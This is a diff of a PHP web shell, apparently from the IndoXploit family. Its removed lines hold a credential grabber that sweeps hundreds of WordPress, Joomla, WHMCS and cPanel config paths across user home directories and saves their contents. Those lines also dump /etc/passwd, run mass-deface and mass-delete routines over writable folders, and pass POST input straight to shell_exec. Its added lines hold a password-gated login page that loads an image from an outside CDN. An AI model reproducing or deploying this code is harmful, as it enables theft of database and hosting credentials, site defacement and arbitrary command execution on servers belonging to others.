-                    "/home/$user_chonx/public_html/Blogs/wp-config.php" => "WordPressBlogs",
-                    "/home/$user_chonx/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
-                    "/home/$user_chonx/public_html/blogs/wp-config.php" => "WordPressBlogs",
-                    "/home/$user_chonx/public_html/beta/wp-config.php" => "WordPressBeta",
-                    "/home/$user_chonx/public_html/Beta/wp-config.php" => "WordPressBeta",
-                    "/home/$user_chonx/public_html/BETA/wp-config.php" => "WordPressBeta",
-                    "/home/$user_chonx/public_html/PRESS/wp-config.php" => "WordPressPress",
-                    "/home/$user_chonx/public_html/Press/wp-config.php" => "WordPressPress",
-                    "/home/$user_chonx/public_html/press/wp-config.php" => "WordPressPress",
-                    "/home/$user_chonx/public_html/Wp/wp-config.php" => "WordPressWp",
-                    "/home/$user_chonx/public_html/wp/wp-config.php" => "WordPressWp",
-                    "/home/$user_chonx/public_html/WP/wp-config.php" => "WordPressWP",
-                    "/home/$user_chonx/public_html/portal/wp-config.php" => "WordPressPortal",
-                    "/home/$user_chonx/public_html/PORTAL/wp-config.php" => "WordPressPortal",
-                    "/home/$user_chonx/public_html/Portal/wp-config.php" => "WordPressPortal",
-                                        "/home1/$user_chonx/.my.cnf" => "cpanel",
-                    "/home1/$user_chonx/.accesshash" => "WHM-accesshash",
-                    "/home1/$user_chonx/public_html/bw-configs/config.ini" => "BosWeb",
-                    "/home1/$user_chonx/public_html/config/koneksi.php" => "Lokomedia",
-                    "/home1/$user_chonx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
-                    "/home1/$user_chonx/public_html/clientarea/configuration.php" => "WHMCS",               
-                    "/home1/$user_chonx/public_html/whmcs/configuration.php" => "WHMCS",
-                    "/home1/$user_chonx/public_html/forum/config.php" => "phpBB",
-                    "/home1/$user_chonx/public_html/sites/default/settings.php" => "Drupal",
-                    "/home1/$user_chonx/public_html/config/settings.inc.php" => "PrestaShop",
-                    "/home1/$user_chonx/public_html/app/etc/local.xml" => "Magento",
-                    "/home1/$user_chonx/public_html/admin/config.php" => "OpenCart",
-                    "/home1/$user_chonx/public_html/slconfig.php" => "Sitelok",
-                    "/home1/$user_chonx/public_html/application/config/database.php" => "Ellislab",                 
-                    "/home1/$user_chonx/public_html/whm/configuration.php" => "WHMCS",
-                    "/home1/$user_chonx/public_html/whmc/WHM/configuration.ph" => "WHMC",
-                    "/home1/$user_chonx/public_html/central/configuration.php" => "WHM Central",
-                    "/home1/$user_chonx/public_html/whm/WHMCS/configuration.php" => "WHMCS",
-                    "/home1/$user_chonx/public_html/whm/whmcs/configuration.php" => "WHMCS",
-                    "/home1/$user_chonx/public_html/submitticket.php" => "WHMCS",                                       
-                    "/home1/$user_chonx/public_html/configuration.php" => "Joomla",                 
-                    "/home1/$user_chonx/public_html/Joomla/configuration.php" => "JoomlaJoomla",
-                    "/home1/$user_chonx/public_html/joomla/configuration.php" => "JoomlaJoomla",
-                    "/home1/$user_chonx/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",        
-                    "/home1/$user_chonx/public_html/Home/configuration.php" => "JoomlaHome",
-                    "/home1/$user_chonx/public_html/HOME/configuration.php" => "JoomlaHome",
-                    "/home1/$user_chonx/public_html/home/configuration.php" => "JoomlaHome",
-                    "/home1/$user_chonx/public_html/NEW/configuration.php" => "JoomlaNew",
-                    "/home1/$user_chonx/public_html/New/configuration.php" => "JoomlaNew",
-                    "/home1/$user_chonx/public_html/new/configuration.php" => "JoomlaNew",
-                    "/home1/$user_chonx/public_html/News/configuration.php" => "JoomlaNews",
-                    "/home1/$user_chonx/public_html/NEWS/configuration.php" => "JoomlaNews",
-                    "/home1/$user_chonx/public_html/news/configuration.php" => "JoomlaNews",
-                    "/home1/$user_chonx/public_html/Cms/configuration.php" => "JoomlaCms",
-                    "/home1/$user_chonx/public_html/CMS/configuration.php" => "JoomlaCms",
-                    "/home1/$user_chonx/public_html/cms/configuration.php" => "JoomlaCms",
-                    "/home1/$user_chonx/public_html/Main/configuration.php" => "JoomlaMain",
-                    "/home1/$user_chonx/public_html/MAIN/configuration.php" => "JoomlaMain",
-                    "/home1/$user_chonx/public_html/main/configuration.php" => "JoomlaMain",
-                    "/home1/$user_chonx/public_html/Blog/configuration.php" => "JoomlaBlog",
-                    "/home1/$user_chonx/public_html/BLOG/configuration.php" => "JoomlaBlog",
-                    "/home1/$user_chonx/public_html/blog/configuration.php" => "JoomlaBlog",
-                    "/home1/$user_chonx/public_html/Blogs/configuration.php" => "JoomlaBlogs",
-                    "/home1/$user_chonx/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
-                    "/home1/$user_chonx/public_html/blogs/configuration.php" => "JoomlaBlogs",
-                    "/home1/$user_chonx/public_html/beta/configuration.php" => "JoomlaBeta",
-                    "/home1/$user_chonx/public_html/Beta/configuration.php" => "JoomlaBeta",
-                    "/home1/$user_chonx/public_html/BETA/configuration.php" => "JoomlaBeta",
-                    "/home1/$user_chonx/public_html/PRESS/configuration.php" => "JoomlaPress",
-                    "/home1/$user_chonx/public_html/Press/configuration.php" => "JoomlaPress",
-                    "/home1/$user_chonx/public_html/press/configuration.php" => "JoomlaPress",
-                    "/home1/$user_chonx/public_html/Wp/configuration.php" => "JoomlaWp",
-                    "/home1/$user_chonx/public_html/wp/configuration.php" => "JoomlaWp",
-                    "/home1/$user_chonx/public_html/WP/configuration.php" => "JoomlaWP",
-                    "/home1/$user_chonx/public_html/portal/configuration.php" => "JoomlaPortal",
-                    "/home1/$user_chonx/public_html/PORTAL/configuration.php" => "JoomlaPortal",
-                    "/home1/$user_chonx/public_html/Portal/configuration.php" => "JoomlaPortal",                    
-                    "/home1/$user_chonx/public_html/wp-config.php" => "WordPress",
-                    "/home1/$user_chonx/public_html/wordpress/wp-config.php" => "WordPressWordpress",
-                    "/home1/$user_chonx/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
-                    "/home1/$user_chonx/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",       
-                    "/home1/$user_chonx/public_html/Home/wp-config.php" => "WordPressHome",
-                    "/home1/$user_chonx/public_html/HOME/wp-config.php" => "WordPressHome",
-                    "/home1/$user_chonx/public_html/home/wp-config.php" => "WordPressHome",
-                    "/home1/$user_chonx/public_html/NEW/wp-config.php" => "WordPressNew",
-                    "/home1/$user_chonx/public_html/New/wp-config.php" => "WordPressNew",
-                    "/home1/$user_chonx/public_html/new/wp-config.php" => "WordPressNew",
-                    "/home1/$user_chonx/public_html/News/wp-config.php" => "WordPressNews",
-                    "/home1/$user_chonx/public_html/NEWS/wp-config.php" => "WordPressNews",
-                    "/home1/$user_chonx/public_html/news/wp-config.php" => "WordPressNews",
-                    "/home1/$user_chonx/public_html/Cms/wp-config.php" => "WordPressCms",
-                    "/home1/$user_chonx/public_html/CMS/wp-config.php" => "WordPressCms",
-                    "/home1/$user_chonx/public_html/cms/wp-config.php" => "WordPressCms",
-                    "/home1/$user_chonx/public_html/Main/wp-config.php" => "WordPressMain",
-                    "/home1/$user_chonx/public_html/MAIN/wp-config.php" => "WordPressMain",
-                    "/home1/$user_chonx/public_html/main/wp-config.php" => "WordPressMain",
-                    "/home1/$user_chonx/public_html/Blog/wp-config.php" => "WordPressBlog",
-                    "/home1/$user_chonx/public_html/BLOG/wp-config.php" => "WordPressBlog",
-                    "/home1/$user_chonx/public_html/blog/wp-config.php" => "WordPressBlog",
-                    "/home1/$user_chonx/public_html/Blogs/wp-config.php" => "WordPressBlogs",
-                    "/home1/$user_chonx/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
-                    "/home1/$user_chonx/public_html/blogs/wp-config.php" => "WordPressBlogs",
-                    "/home1/$user_chonx/public_html/beta/wp-config.php" => "WordPressBeta",
-                    "/home1/$user_chonx/public_html/Beta/wp-config.php" => "WordPressBeta",
-                    "/home1/$user_chonx/public_html/BETA/wp-config.php" => "WordPressBeta",
-                    "/home1/$user_chonx/public_html/PRESS/wp-config.php" => "WordPressPress",
-                    "/home1/$user_chonx/public_html/Press/wp-config.php" => "WordPressPress",
-                    "/home1/$user_chonx/public_html/press/wp-config.php" => "WordPressPress",
-                    "/home1/$user_chonx/public_html/Wp/wp-config.php" => "WordPressWp",
-                    "/home1/$user_chonx/public_html/wp/wp-config.php" => "WordPressWp",
-                    "/home1/$user_chonx/public_html/WP/wp-config.php" => "WordPressWP",
-                    "/home1/$user_chonx/public_html/portal/wp-config.php" => "WordPressPortal",
-                    "/home1/$user_chonx/public_html/PORTAL/wp-config.php" => "WordPressPortal",
-                    "/home1/$user_chonx/public_html/Portal/wp-config.php" => "WordPressPortal",
-                                        "/home2/$user_chonx/.my.cnf" => "cpanel",
-                    "/home2/$user_chonx/.accesshash" => "WHM-accesshash",
-                    "/home2/$user_chonx/public_html/bw-configs/config.ini" => "BosWeb",
-                    "/home2/$user_chonx/public_html/config/koneksi.php" => "Lokomedia",
-                    "/home2/$user_chonx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
-                    "/home2/$user_chonx/public_html/clientarea/configuration.php" => "WHMCS",               
-                    "/home2/$user_chonx/public_html/whmcs/configuration.php" => "WHMCS",
-                    "/home2/$user_chonx/public_html/forum/config.php" => "phpBB",
-                    "/home2/$user_chonx/public_html/sites/default/settings.php" => "Drupal",
-                    "/home2/$user_chonx/public_html/config/settings.inc.php" => "PrestaShop",
-                    "/home2/$user_chonx/public_html/app/etc/local.xml" => "Magento",
-                    "/home2/$user_chonx/public_html/admin/config.php" => "OpenCart",
-                    "/home2/$user_chonx/public_html/slconfig.php" => "Sitelok",
-                    "/home2/$user_chonx/public_html/application/config/database.php" => "Ellislab",                 
-                    "/home2/$user_chonx/public_html/whm/configuration.php" => "WHMCS",
-                    "/home2/$user_chonx/public_html/whmc/WHM/configuration.ph" => "WHMC",
-                    "/home2/$user_chonx/public_html/central/configuration.php" => "WHM Central",
-                    "/home2/$user_chonx/public_html/whm/WHMCS/configuration.php" => "WHMCS",
-                    "/home2/$user_chonx/public_html/whm/whmcs/configuration.php" => "WHMCS",
-                    "/home2/$user_chonx/public_html/submitticket.php" => "WHMCS",                                       
-                    "/home2/$user_chonx/public_html/configuration.php" => "Joomla",                 
-                    "/home2/$user_chonx/public_html/Joomla/configuration.php" => "JoomlaJoomla",
-                    "/home2/$user_chonx/public_html/joomla/configuration.php" => "JoomlaJoomla",
-                    "/home2/$user_chonx/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",        
-                    "/home2/$user_chonx/public_html/Home/configuration.php" => "JoomlaHome",
-                    "/home2/$user_chonx/public_html/HOME/configuration.php" => "JoomlaHome",
-                    "/home2/$user_chonx/public_html/home/configuration.php" => "JoomlaHome",
-                    "/home2/$user_chonx/public_html/NEW/configuration.php" => "JoomlaNew",
-                    "/home2/$user_chonx/public_html/New/configuration.php" => "JoomlaNew",
-                    "/home2/$user_chonx/public_html/new/configuration.php" => "JoomlaNew",
-                    "/home2/$user_chonx/public_html/News/configuration.php" => "JoomlaNews",
-                    "/home2/$user_chonx/public_html/NEWS/configuration.php" => "JoomlaNews",
-                    "/home2/$user_chonx/public_html/news/configuration.php" => "JoomlaNews",
-                    "/home2/$user_chonx/public_html/Cms/configuration.php" => "JoomlaCms",
-                    "/home2/$user_chonx/public_html/CMS/configuration.php" => "JoomlaCms",
-                    "/home2/$user_chonx/public_html/cms/configuration.php" => "JoomlaCms",
-                    "/home2/$user_chonx/public_html/Main/configuration.php" => "JoomlaMain",
-                    "/home2/$user_chonx/public_html/MAIN/configuration.php" => "JoomlaMain",
-                    "/home2/$user_chonx/public_html/main/configuration.php" => "JoomlaMain",
-                    "/home2/$user_chonx/public_html/Blog/configuration.php" => "JoomlaBlog",
-                    "/home2/$user_chonx/public_html/BLOG/configuration.php" => "JoomlaBlog",
-                    "/home2/$user_chonx/public_html/blog/configuration.php" => "JoomlaBlog",
-                    "/home2/$user_chonx/public_html/Blogs/configuration.php" => "JoomlaBlogs",
-                    "/home2/$user_chonx/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
-                    "/home2/$user_chonx/public_html/blogs/configuration.php" => "JoomlaBlogs",
-                    "/home2/$user_chonx/public_html/beta/configuration.php" => "JoomlaBeta",
-                    "/home2/$user_chonx/public_html/Beta/configuration.php" => "JoomlaBeta",
-                    "/home2/$user_chonx/public_html/BETA/configuration.php" => "JoomlaBeta",
-                    "/home2/$user_chonx/public_html/PRESS/configuration.php" => "JoomlaPress",
-                    "/home2/$user_chonx/public_html/Press/configuration.php" => "JoomlaPress",
-                    "/home2/$user_chonx/public_html/press/configuration.php" => "JoomlaPress",
-                    "/home2/$user_chonx/public_html/Wp/configuration.php" => "JoomlaWp",
-                    "/home2/$user_chonx/public_html/wp/configuration.php" => "JoomlaWp",
-                    "/home2/$user_chonx/public_html/WP/configuration.php" => "JoomlaWP",
-                    "/home2/$user_chonx/public_html/portal/configuration.php" => "JoomlaPortal",
-                    "/home2/$user_chonx/public_html/PORTAL/configuration.php" => "JoomlaPortal",
-                    "/home2/$user_chonx/public_html/Portal/configuration.php" => "JoomlaPortal",                    
-                    "/home2/$user_chonx/public_html/wp-config.php" => "WordPress",
-                    "/home2/$user_chonx/public_html/wordpress/wp-config.php" => "WordPressWordpress",
-                    "/home2/$user_chonx/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
-                    "/home2/$user_chonx/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",       
-                    "/home2/$user_chonx/public_html/Home/wp-config.php" => "WordPressHome",
-                    "/home2/$user_chonx/public_html/HOME/wp-config.php" => "WordPressHome",
-                    "/home2/$user_chonx/public_html/home/wp-config.php" => "WordPressHome",
-                    "/home2/$user_chonx/public_html/NEW/wp-config.php" => "WordPressNew",
-                    "/home2/$user_chonx/public_html/New/wp-config.php" => "WordPressNew",
-                    "/home2/$user_chonx/public_html/new/wp-config.php" => "WordPressNew",
-                    "/home2/$user_chonx/public_html/News/wp-config.php" => "WordPressNews",
-                    "/home2/$user_chonx/public_html/NEWS/wp-config.php" => "WordPressNews",
-                    "/home2/$user_chonx/public_html/news/wp-config.php" => "WordPressNews",
-                    "/home2/$user_chonx/public_html/Cms/wp-config.php" => "WordPressCms",
-                    "/home2/$user_chonx/public_html/CMS/wp-config.php" => "WordPressCms",
-                    "/home2/$user_chonx/public_html/cms/wp-config.php" => "WordPressCms",
-                    "/home2/$user_chonx/public_html/Main/wp-config.php" => "WordPressMain",
-                    "/home2/$user_chonx/public_html/MAIN/wp-config.php" => "WordPressMain",
-                    "/home2/$user_chonx/public_html/main/wp-config.php" => "WordPressMain",
-                    "/home2/$user_chonx/public_html/Blog/wp-config.php" => "WordPressBlog",
-                    "/home2/$user_chonx/public_html/BLOG/wp-config.php" => "WordPressBlog",
-                    "/home2/$user_chonx/public_html/blog/wp-config.php" => "WordPressBlog",
-                    "/home2/$user_chonx/public_html/Blogs/wp-config.php" => "WordPressBlogs",
-                    "/home2/$user_chonx/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
-                    "/home2/$user_chonx/public_html/blogs/wp-config.php" => "WordPressBlogs",
-                    "/home2/$user_chonx/public_html/beta/wp-config.php" => "WordPressBeta",
-                    "/home2/$user_chonx/public_html/Beta/wp-config.php" => "WordPressBeta",
-                    "/home2/$user_chonx/public_html/BETA/wp-config.php" => "WordPressBeta",
-                    "/home2/$user_chonx/public_html/PRESS/wp-config.php" => "WordPressPress",
-                    "/home2/$user_chonx/public_html/Press/wp-config.php" => "WordPressPress",
-                    "/home2/$user_chonx/public_html/press/wp-config.php" => "WordPressPress",
-                    "/home2/$user_chonx/public_html/Wp/wp-config.php" => "WordPressWp",
-                    "/home2/$user_chonx/public_html/wp/wp-config.php" => "WordPressWp",
-                    "/home2/$user_chonx/public_html/WP/wp-config.php" => "WordPressWP",
-                    "/home2/$user_chonx/public_html/portal/wp-config.php" => "WordPressPortal",
-                    "/home2/$user_chonx/public_html/PORTAL/wp-config.php" => "WordPressPortal",
-                    "/home2/$user_chonx/public_html/Portal/wp-config.php" => "WordPressPortal",
-                    "/home3/$user_chonx/.my.cnf" => "cpanel",
-                    "/home3/$user_chonx/.accesshash" => "WHM-accesshash",
-                    "/home3/$user_chonx/public_html/bw-configs/config.ini" => "BosWeb",
-                    "/home3/$user_chonx/public_html/config/koneksi.php" => "Lokomedia",
-                    "/home3/$user_chonx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
-                    "/home3/$user_chonx/public_html/clientarea/configuration.php" => "WHMCS",               
-                    "/home3/$user_chonx/public_html/whmcs/configuration.php" => "WHMCS",
-                    "/home3/$user_chonx/public_html/forum/config.php" => "phpBB",
-                    "/home3/$user_chonx/public_html/sites/default/settings.php" => "Drupal",
-                    "/home3/$user_chonx/public_html/config/settings.inc.php" => "PrestaShop",
-                    "/home3/$user_chonx/public_html/app/etc/local.xml" => "Magento",
-                    "/home3/$user_chonx/public_html/admin/config.php" => "OpenCart",
-                    "/home3/$user_chonx/public_html/slconfig.php" => "Sitelok",
-                    "/home3/$user_chonx/public_html/application/config/database.php" => "Ellislab",                 
-                    "/home3/$user_chonx/public_html/whm/configuration.php" => "WHMCS",
-                    "/home3/$user_chonx/public_html/whmc/WHM/configuration.ph" => "WHMC",
-                    "/home3/$user_chonx/public_html/central/configuration.php" => "WHM Central",
-                    "/home3/$user_chonx/public_html/whm/WHMCS/configuration.php" => "WHMCS",
-                    "/home3/$user_chonx/public_html/whm/whmcs/configuration.php" => "WHMCS",
-                    "/home3/$user_chonx/public_html/submitticket.php" => "WHMCS",                                       
-                    "/home3/$user_chonx/public_html/configuration.php" => "Joomla",                 
-                    "/home3/$user_chonx/public_html/Joomla/configuration.php" => "JoomlaJoomla",
-                    "/home3/$user_chonx/public_html/joomla/configuration.php" => "JoomlaJoomla",
-                    "/home3/$user_chonx/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",        
-                    "/home3/$user_chonx/public_html/Home/configuration.php" => "JoomlaHome",
-                    "/home3/$user_chonx/public_html/HOME/configuration.php" => "JoomlaHome",
-                    "/home3/$user_chonx/public_html/home/configuration.php" => "JoomlaHome",
-                    "/home3/$user_chonx/public_html/NEW/configuration.php" => "JoomlaNew",
-                    "/home3/$user_chonx/public_html/New/configuration.php" => "JoomlaNew",
-                    "/home3/$user_chonx/public_html/new/configuration.php" => "JoomlaNew",
-                    "/home3/$user_chonx/public_html/News/configuration.php" => "JoomlaNews",
-                    "/home3/$user_chonx/public_html/NEWS/configuration.php" => "JoomlaNews",
-                    "/home3/$user_chonx/public_html/news/configuration.php" => "JoomlaNews",
-                    "/home3/$user_chonx/public_html/Cms/configuration.php" => "JoomlaCms",
-                    "/home3/$user_chonx/public_html/CMS/configuration.php" => "JoomlaCms",
-                    "/home3/$user_chonx/public_html/cms/configuration.php" => "JoomlaCms",
-                    "/home3/$user_chonx/public_html/Main/configuration.php" => "JoomlaMain",
-                    "/home3/$user_chonx/public_html/MAIN/configuration.php" => "JoomlaMain",
-                    "/home3/$user_chonx/public_html/main/configuration.php" => "JoomlaMain",
-                    "/home3/$user_chonx/public_html/Blog/configuration.php" => "JoomlaBlog",
-                    "/home3/$user_chonx/public_html/BLOG/configuration.php" => "JoomlaBlog",
-                    "/home3/$user_chonx/public_html/blog/configuration.php" => "JoomlaBlog",
-                    "/home3/$user_chonx/public_html/Blogs/configuration.php" => "JoomlaBlogs",
-                    "/home3/$user_chonx/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
-                    "/home3/$user_chonx/public_html/blogs/configuration.php" => "JoomlaBlogs",
-                    "/home3/$user_chonx/public_html/beta/configuration.php" => "JoomlaBeta",
-                    "/home3/$user_chonx/public_html/Beta/configuration.php" => "JoomlaBeta",
-                    "/home3/$user_chonx/public_html/BETA/configuration.php" => "JoomlaBeta",
-                    "/home3/$user_chonx/public_html/PRESS/configuration.php" => "JoomlaPress",
-                    "/home3/$user_chonx/public_html/Press/configuration.php" => "JoomlaPress",
-                    "/home3/$user_chonx/public_html/press/configuration.php" => "JoomlaPress",
-                    "/home3/$user_chonx/public_html/Wp/configuration.php" => "JoomlaWp",
-                    "/home3/$user_chonx/public_html/wp/configuration.php" => "JoomlaWp",
-                    "/home3/$user_chonx/public_html/WP/configuration.php" => "JoomlaWP",
-                    "/home3/$user_chonx/public_html/portal/configuration.php" => "JoomlaPortal",
-                    "/home3/$user_chonx/public_html/PORTAL/configuration.php" => "JoomlaPortal",
-                    "/home3/$user_chonx/public_html/Portal/configuration.php" => "JoomlaPortal",                    
-                    "/home3/$user_chonx/public_html/wp-config.php" => "WordPress",
-                    "/home3/$user_chonx/public_html/wordpress/wp-config.php" => "WordPressWordpress",
-                    "/home3/$user_chonx/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
-                    "/home3/$user_chonx/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",       
-                    "/home3/$user_chonx/public_html/Home/wp-config.php" => "WordPressHome",
-                    "/home3/$user_chonx/public_html/HOME/wp-config.php" => "WordPressHome",
-                    "/home3/$user_chonx/public_html/home/wp-config.php" => "WordPressHome",
-                    "/home3/$user_chonx/public_html/NEW/wp-config.php" => "WordPressNew",
-                    "/home3/$user_chonx/public_html/New/wp-config.php" => "WordPressNew",
-                    "/home3/$user_chonx/public_html/new/wp-config.php" => "WordPressNew",
-                    "/home3/$user_chonx/public_html/News/wp-config.php" => "WordPressNews",
-                    "/home3/$user_chonx/public_html/NEWS/wp-config.php" => "WordPressNews",
-                    "/home3/$user_chonx/public_html/news/wp-config.php" => "WordPressNews",
-                    "/home3/$user_chonx/public_html/Cms/wp-config.php" => "WordPressCms",
-                    "/home3/$user_chonx/public_html/CMS/wp-config.php" => "WordPressCms",
-                    "/home3/$user_chonx/public_html/cms/wp-config.php" => "WordPressCms",
-                    "/home3/$user_chonx/public_html/Main/wp-config.php" => "WordPressMain",
-                    "/home3/$user_chonx/public_html/MAIN/wp-config.php" => "WordPressMain",
-                    "/home3/$user_chonx/public_html/main/wp-config.php" => "WordPressMain",
-                    "/home3/$user_chonx/public_html/Blog/wp-config.php" => "WordPressBlog",
-                    "/home3/$user_chonx/public_html/BLOG/wp-config.php" => "WordPressBlog",
-                    "/home3/$user_chonx/public_html/blog/wp-config.php" => "WordPressBlog",
-                    "/home3/$user_chonx/public_html/Blogs/wp-config.php" => "WordPressBlogs",
-                    "/home3/$user_chonx/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
-                    "/home3/$user_chonx/public_html/blogs/wp-config.php" => "WordPressBlogs",
-                    "/home3/$user_chonx/public_html/beta/wp-config.php" => "WordPressBeta",
-                    "/home3/$user_chonx/public_html/Beta/wp-config.php" => "WordPressBeta",
-                    "/home3/$user_chonx/public_html/BETA/wp-config.php" => "WordPressBeta",
-                    "/home3/$user_chonx/public_html/PRESS/wp-config.php" => "WordPressPress",
-                    "/home3/$user_chonx/public_html/Press/wp-config.php" => "WordPressPress",
-                    "/home3/$user_chonx/public_html/press/wp-config.php" => "WordPressPress",
-                    "/home3/$user_chonx/public_html/Wp/wp-config.php" => "WordPressWp",
-                    "/home3/$user_chonx/public_html/wp/wp-config.php" => "WordPressWp",
-                    "/home3/$user_chonx/public_html/WP/wp-config.php" => "WordPressWP",
-                    "/home3/$user_chonx/public_html/portal/wp-config.php" => "WordPressPortal",
-                    "/home3/$user_chonx/public_html/PORTAL/wp-config.php" => "WordPressPortal",
-                    "/home3/$user_chonx/public_html/Portal/wp-config.php" => "WordPressPortal"                  
-                        );  
-                    foreach($grab_config as $config => $nama_config) {
-                        $ambil_config = file_get_contents($config);
-                        if($ambil_config == '') {
-                        } else {
-                            $file_config = fopen("403_config/$user_chonx-$nama_config.txt","w");
-                            fputs($file_config,$ambil_config);
-                        }
-                    }
-                }       
-            }
-            echo "<center><a href='?dir=$dir/403_config'><font color=lime>Done</font></a></center>";
-            }else{
-                
-        echo "<form method=\"post\" action=\"\"><center>etc/passw ( Error ? <a href='?dir=$dir&do=passwbypass'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
-        echo file_get_contents('/etc/passwd'); 
-        echo "</textarea><br><input type=\"submit\" value=\"SUBMIT\"></td></tr></center>\n";
-        }
-    }
-
-    echo "</p></div>";
-if(isset($_GET['mass_deface'])) {
-echo "$_s";
-function mass_kabeh($dir,$namafile,$isi_script) {
-if(is_writable($dir)) {
-    $dira = scandir($dir);
-    foreach($dira as $dirb) {
-        $dirc = "$dir/$dirb";
-        $▚ = $dirc.'/'.$namafile;
-        if($dirb === '.') {
-            file_put_contents($▚, $isi_script);
-        } elseif($dirb === '..') {
-            file_put_contents($▚, $isi_script);
-        } else {
-            if(is_dir($dirc)) {
-                if(is_writable($dirc)) {
-                    echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
-                    file_put_contents($▚, $isi_script);
-                    $▟ = mass_kabeh($dirc,$namafile,$isi_script);
-                    }
-                }
-            }
-        }
-    }
+</style>
+</head>
+<center>
+<header>
+	<pre>
+ ___________________________
+< root@indoxploit:~# w00t??? >
+ ---------------------------
+   \         ,        ,
+    \       /(        )`
+     \      \ \___   / |
+            /- _  `-/  '
+           (/\/ \ \   /\
+           / /   | `    \
+           O O   ) /    |
+           `-^--'`<     '
+          (_.)  _  )   /
+           `.___/`    /
+             `-----' /
+<----.     __ / __   \
+<----|====O)))==) \) /====>
+<----'    `--' `.__,' \
+             |        |
+              \       /
+        ______( (_  / \______
+      ,'  ,-----'   |        \
+      `--{__________)        \/
+	</pre>
+</header>
+<form method="post">
+<input type="password" name="password">
+</form>
+<center><img src="https://cdn.privdayz.com/images/logo.jpg" referrerpolicy="unsafe-url" /></center>
+<?php
+exit;
 }
 
-function mass_biasa($dir,$namafile,$isi_script) {
-    if(is_writable($dir)) {
-        $dira = scandir($dir);
-        foreach($dira as $dirb) {
-            $dirc = "$dir/$dirb";
-            $▚ = $dirc.'/'.$namafile;
-            if($dirb === '.') {
-                file_put_contents($▚, $isi_script);
-            } elseif($dirb === '..') {
-                file_put_contents($▚, $isi_script);
-            } else {
-                if(is_dir($dirc)) {
-                    if(is_writable($dirc)) {
-                        echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$dirb/$namafile<br>";
-                        file_put_contents($▚, $isi_script);
-                    }
-                }
-            }
-        }
-    }
-}
-if($_POST['start']) {
-    if($_POST['tipe'] == 'massal') {
-    mass_kabeh($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
-    } elseif($_POST['tipe'] == 'biasa') {
-    mass_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
-    }
-}
-echo "
-<div class='mb-3'>
-    <form method='POST'> Type : 
-    <div class='form-check'>
-        <input class='form-check-input' type='checkbox' value='biasa' name='tipe' id='flexCheckDefault' checked>
-        <label class='form-check-label' for='flexCheckDefault'>Normal</label>
-    </div>
-    <div class='form-check'>
-        <input class='form-check-input' type='checkbox' value='massal' name='tipe' id='flexCheckDefault'>
-        <label class='form-check-label' for='flexCheckDefault'>Mass</label>
-    </div>
-        <i class='bi bi-folder'></i> Location:
-        <input class='form-control btn-sm' type='text' name='d_dir' value='$dir'>
-        <i class='bi bi-file-earmark'></i> File Name:
-        <input class='form-control btn-sm' type='text' name='d_file' placeholder='File Name' $_r>
-        <i class='bi bi-file-earmark'></i> File contents:
-        <textarea class='form-control btn-sm' rows='7' name='script' placeholder=' File contents' $_r></textarea>
-        <div class='d-grid gap-2'>
-            <input class='btn btn-outline-light btn-sm' type='submit' name='start' value='MASS DEFACE'>
-        </div>
-    </form>
-</div>";
-}
-if(isset($_GET['mass_delete'])) {
-echo "$_s";
-function hapus_massal($dir,$namafile) {
-if(is_writable($dir)) {
-    $dira = scandir($dir);
-    foreach($dira as $dirb) {
-        $dirc = "$dir/$dirb";
-        $▚ = $dirc.'/'.$namafile;
-        if($dirb === '.') {
-            if(file_exists("$dir/$namafile")) {
-                unlink("$dir/$namafile");
-            }
-        } elseif($dirb === '..') {
-            if(file_exists("".dirname($dir)."/$namafile")) {
-                unlink("".dirname($dir)."/$namafile");
-            }
-        } else {
-            if(is_dir($dirc)) {
-                if(is_writable($dirc)) {
-                    if(file_exists($▚)) {
-                        echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
-                        unlink($▚);
-                        $▟ = hapus_massal($dirc,$namafile);
-                        }
-                    }
-                }
-            }
-        }
-    }
-}
+if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
+    if(empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password)))
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+    else
+        login_shell();
 
-if($_POST['start']) {
-    hapus_massal($_POST['d_dir'], $_POST['d_file']);
-}
-echo "
-<div class='mb-3'>
-    <form method='POST'>
-        <i class='bi bi-folder'></i> Location:
-        <input class='form-control btn-sm' type='text' name='d_dir' value='$dir'>
-            <i class='bi bi-file-earmark'></i> Filename:
-        <div class='input-group mb-3'>
-            <input class='form-control btn-sm' type='text' name='d_file' placeholder='Filename' $_r><br>
-        <div class='input-group-append'>
-            <input class='btn btn-outline-light btn-sm' type='submit' name='start' value='mass delete'>
-        </div>
-    </form>
-</div>";
-}
-if(isset($_GET['cmd'])) {
-if(!empty($_POST['cmd'])) {
-    $cmd = shell_exec($_POST['cmd'].' 2>&1');
-}
-echo "$_s
-<div class='mb-3'>
-<form method='POST'>
-    <div class='input-group mb-3'>
-        <input class='form-control btn-sm' type='text' name='cmd' value='".htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8')."' placeholder='whoami' $_r>
-        <button class='btn btn-outline-light btn-sm' type='sumbit'><i class='bi bi-arrow-return-right'></i></button>
-    </div>
-</form>";
-if($cmd):
-echo '
-<div class="container-fluid language-javascript">
-    <div class="shell mb-3">
